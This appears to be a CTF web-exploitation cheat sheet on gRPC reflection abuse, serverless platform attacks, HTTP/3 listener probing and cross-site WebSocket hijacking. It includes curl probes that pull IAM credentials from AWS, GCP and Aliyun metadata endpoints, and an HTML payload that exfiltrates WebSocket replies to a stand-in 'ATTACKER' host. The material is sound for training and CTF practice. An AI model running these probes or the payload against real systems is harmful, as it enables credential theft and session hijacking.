# CTF Web - Modern Protocols: gRPC / Serverless / HTTP/3

The 2024-2026 web surface keeps appearing on transports and API protocols that classic HTTP tooling was never built for: **gRPC** (RPC over HTTP/2 with binary protobuf), **serverless / FaaS** function entry points (HTTP in, but the interesting surface is platform config, events and metadata), and **HTTP/3 over QUIC** (UDP — rarely enabled, which is exactly why an enabled h3 listener is suspicious). This file is the entry point for those three; ordinary HTTP mechanics still follow the rest of the library. Related material lives elsewhere: request-smuggling / header mechanics in [client-side.md](client-side.md), SSRF and cloud-metadata deep dives in [server-side.md](server-side.md) / [server-side-advanced-2.md](server-side-advanced-2.md), WebSocket server-side JSON bugs in [server-side-exec.md](server-side-exec.md).

## Table of Contents
- [gRPC / Protobuf](#grpc--protobuf)
- [Serverless / FaaS](#serverless--faas)
- [HTTP/3 (QUIC)](#http3-quic)
- [WebSocket Supplement (Cross-Origin Hijack / Smuggling)](#websocket-supplement-cross-origin-hijack--smuggling)

---

## gRPC / Protobuf

**What it is:** gRPC is an RPC framework whose transport is **HTTP/2** (RFC 7540) carrying protobuf (binary) or protojson messages. A gRPC connection is either plaintext h2c or TLS with ALPN `h2`; there is no HTTP/1.1 gRPC (gRPC-Web, content-type `application/grpc-web+proto`, is the HTTP/1.1 bridge). Typical ports: 50051 (framework default), 9000/9090, 443/8443.

**Recognition signals:**
- Content-type `application/grpc` / `application/grpc+proto` / `application/grpc+json`; responses carry `grpc-status`, `grpc-message`, `grpc-encoding`, and the client must send `te: trailers`.
- Raw HTTP/2 traffic shows the 24-byte preface `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`; over TLS, ALPN negotiates `h2` — probe with `openssl s_client -connect HOST:PORT -alpn h2 -servername HOST`. A TLS port that only answers when the client advertises `h2` is itself an ALPN fingerprint of an HTTP/2-only service.
- `nmap -sV -p 50051` often reports the service as "grpc"; Wireshark decodes the traffic under its HTTP/2 dissector.

**Attack surface:**
1. **gRPC reflection is the recon primitive.** Many servers leave the reflection service enabled (`grpc.reflection.v1.ServerReflection` / `v1alpha` — one framework line, frequently left on in challenge images). `grpcurl -plaintext HOST:PORT list` enumerates every service unauthenticated; `grpcurl -plaintext HOST:PORT describe pkg.Service` dumps methods and message fields; **no proto files are needed**. Run this before touching anything else.
2. **Unauthenticated method calls.** With reflection (or provided `.proto` + `-proto`/`-import-path`) call any listed method directly: `grpcurl -plaintext -d '{"id": 1}' HOST:PORT pkg.Service/Method`. Missing per-method authorization is the common CTF bug — an API map from reflection plus one stray privileged method is usually the whole challenge.
3. **Protobuf parse divergence.** Wire encoding is varint-based: int32 fields truncate/wrap on values beyond 2^31-1 (behavior differs per implementation — probe it), negative values encode as 10-byte varints, uint32/uint64 wraparound, out-of-range enums fall to the zero value (proto3) or error (proto2), binary decode ignores unknown field numbers while JSON bridges may reject or drop unknown names. When validation and business logic run in different runtimes (Go/Python backend vs JS frontend), send extremes — `-1`, `4294967296`, 2^53-scale numbers (JS number precision loss), unknown enum values — and look for "default branch" logic bypasses.
4. **Metadata header injection — the HTTP/2 flavour.** gRPC metadata rides as HTTP/2 headers, so classic CRLF header injection does not apply. The modern analogues: pseudo-header confusion (`:authority` vs `Host` at an HTTP/1.1↔HTTP/2 boundary — the basis of h2c/HTTP-2 request smuggling), header-name normalization gaps (underscore variants such as `x_forwarded_for` vs `x_forwarded-for` are parsed differently by some proxies), and `grpc-timeout` / `grpc-status` values that downstream code trusts. Send odd metadata keys and watch what the app echoes or logs.
5. **h2c / cleartext smuggling.** An `Upgrade: h2c` path or a raw cleartext h2 port lets you reach gRPC without TLS and desync an HTTP/1.1 front proxy — the HTTP/2 request-smuggling family (details in [client-side.md](client-side.md)).

**Key insight:** treat reflection like a route scan — `list` then `describe` gives you the full API surface without guessing endpoints, and the flag usually sits behind the method that was never given an auth check.

**Tooling:** `grpcurl` (`list` / `describe` / `call`), `grpcui` (browser UI), `evans` (REPL), Burp's HTTP/2 repeater support, Wireshark for pcaps, and `protobuf-inspector` to decode raw protobuf bytes with no schema.

---

## Serverless / FaaS

**What it is:** cloud-function platforms — AWS Lambda, GCP Cloud Functions / Cloud Run, Azure Functions, Alibaba FC, Tencent SCF, and edge runtimes (Cloudflare Workers, Vercel / Netlify functions) — fronted by an HTTP entry URL. The handler receives an **event object** (headers, query, body, path parameters, `isBase64Encoded`...), not a raw socket, so input shaping is JSON-ish and the interesting surface is the platform configuration around the handler.

**Recognition signals:**
- Platform headers: `x-amzn-RequestId` / `x-amz-*` (API Gateway / Lambda URL), `cf-ray` / `server: cloudflare` (Workers), `x-vercel-*`, paths like `/.netlify/functions/` or `/api/...`, hostnames `*.cloudfunctions.net`, `*.lambda-url.*.on.aws`.
- No app-server banner: absent `Server: nginx/apache`, minimal static headers, and responses generated by the runtime wrapper.

**Attack surface:**
1. **Event-object injection.** Treat every event field as attacker input: `queryStringParameters`, `body` (JSON or base64), `headers`, `pathParameters`, `multiValueHeaders`, and the `isBase64Encoded` toggle. Sinks are the same as normal web (SQLi / SSRF / injection), but the wrapper format matters — a proxy in front forwards only some fields, so fuzz which event keys actually reach the handler.
2. **Cloud metadata / credentials.** After SSRF or RCE this is the prize:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (IMDSv1; IMDSv2 requires a `X-aws-ec2-metadata-token` from a PUT first). On Lambda, RCE alone suffices — role credentials are injected directly as env vars (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`).
   - GCP: `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` with header `Metadata-Flavor: Google` (reachable from Compute Engine and Cloud Run; reachability from 1st-gen Cloud Functions varies — 以实际为准).
   - Aliyun: `http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>`.
   - Stolen creds usually map to object-storage buckets that hold the flag or the deployment artifacts.
3. **Environment-variable abuse.** CTF functions keep secrets (DB URL, deploy token, internal API keys) in env vars. Reach them via RCE (`os.environ` / `process.env` / `env`), via error/log echo, or via SSRF into the platform's own config endpoints.
4. **Deployment artifact leaks.** Unencrypted deployment packages sit on the object store or build cache: try bucket listing (`storage.googleapis.com/<bucket>`, S3 bucket names from error messages or hostnames) and `/.git` on the function source server. A leaked zip → source review → hardcoded secrets.
5. **Storage-trigger chains.** Object upload (S3/GCS) → event → function. If you can write to the bucket (public write, guessed signed URL, leaked creds), you control the payload of the next invocation — a stateful backdoor that looks like normal traffic.
6. **Cold-start cache.** Lambda's `/tmp` persists between warm invocations within the same execution environment: write a marker/cache and read it on a later call, or use it as a cross-"session" storage channel. Cold-start *timing* is a weak oracle (rarely useful in CTF — treat as noise).

**Key insight:** in CTFs "serverless" is usually branded HTTP — solve it as a normal web challenge first (the rest of this library), then pivot to metadata / env / artifact probes once you have SSRF or RCE. The platform, not the handler, is where the extra surface hides.

```bash
# metadata probes to try after SSRF/RCE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/              # AWS
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token  # GCP
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/              # Aliyun
```

---

## HTTP/3 (QUIC)

**What it is:** HTTP/3 (RFC 9114) runs HTTP over QUIC (RFC 9000), a **UDP**-based transport with TLS 1.3 built in (RFC 9001), connection IDs, and 0-RTT resumption. It is not a default anywhere: nginx needs a QUIC-capable build plus `listen 443 quic`, Apache httpd has no stable h3, and most CTF images never enable it — so an h3 surface means the challenge **explicitly** shipped it, often as a second listener with different behavior.

**Recognition signals:**
- UDP port (usually 443) answering while TCP 443 also serves TLS.
- `Alt-Svc: h3=":443"` in the HTTP response, or `h3` in the DNS HTTPS record: `dig +short -t HTTPS HOST` → `1 . alpn="h3,h2,http/1.1"`.
- Wireshark: UDP 443 decoded as "QUIC IETF" (use `Analyze → Decode As → QUIC` if needed); browser devtools shows an "HTTP/3" protocol column.
- `curl -sI --http3 https://HOST/` succeeds while plain `curl -I` hits h2/h1 — requires a QUIC-enabled curl build (`curl -V` lists `HTTP3` in Features).

**Attack surface (CTF-relevant overview):**
1. **The h3 listener is a separate config.** Re-run every request over h3: different route table, cache, WAF rules, or auth layer is common when h3 was left on as an afterthought. This is the practical #1 — an h3-only path to an endpoint the TCP-fronted protection blocks.
2. **0-RTT replay.** QUIC 0-RTT early data can be replayed by a network attacker until the server rotates keys (RFC 9001 anti-replay is best-effort). In CTF terms: an authenticated request captured from a pcap can be replayed against the h3 port — test replay of state-changing calls.
3. **Cross-protocol / QUIC smuggling (2025 research).** HTTP/3 frontends proxying to h2/h1 backends produce desyncs analogous to h2c smuggling; stream/header handling differs per implementation (QPACK vs HPACK, `:path`/`:authority` normalization). Research-grade: no stable public CTF payload catalogue as of early 2026 — 以实际为准; if the challenge ships a pcap or an h3→h2 proxy, suspect it.
4. **Transport tricks.** Connection migration / NAT rebinding can confuse the server's security state, and reset injection can kill a stream — mostly DoS/noise in CTF; listed for completeness.

**Key insight:** QUIC itself is rarely the vuln — the question is "what does the h3 listener expose that TCP does not". Probe it with the same request set, then diff.

**Tooling:** `curl --http3` / `--http3-only` (check `curl -V` for HTTP3), Python `aioquic` (`examples/http3_client.py`), Wireshark QUIC dissector. Decrypting h3 pcaps needs TLS keys — `SSLKEYLOGFILE` support depends on the QUIC stack (aioquic can save secrets; curl's keylog support varies by build — 以实际为准).

---

## WebSocket Supplement (Cross-Origin Hijack / Smuggling)

**Cross-origin WebSocket hijack (CSWSH):** the browser includes cookies in the WS handshake; if the server never checks `Origin`, any attacker page can open `new WebSocket('ws://HOST/socket')`, speak on a live authenticated session, and exfiltrate replies — CSRF's cousin; the fix is an Origin/CSRF-token check, not SameSite cookies alone.

```html
<script>var ws=new WebSocket('ws://HOST/socket');
ws.onopen=()=>ws.send('{"cmd":"flag"}');
ws.onmessage=e=>fetch('//ATTACKER/?d='+encodeURIComponent(e.data));</script>
```

**vs the HTTP layer:** WebSocket is length-prefixed, client-masked **frames**, not CRLF-delimited lines, so classic CL/TE desync does not apply; "WS smuggling" instead means proxy/Upgrade confusion (an HTTP/1.1 proxy keeps the connection as HTTP while the backend upgraded it, so bytes after the upgrade get mis-parsed) and using a WS endpoint as a tunnel to reach internal HTTP (WS-as-SSRF). Server-side WS JSON-handling bugs (mass assignment) are covered in [server-side-exec.md](server-side-exec.md).
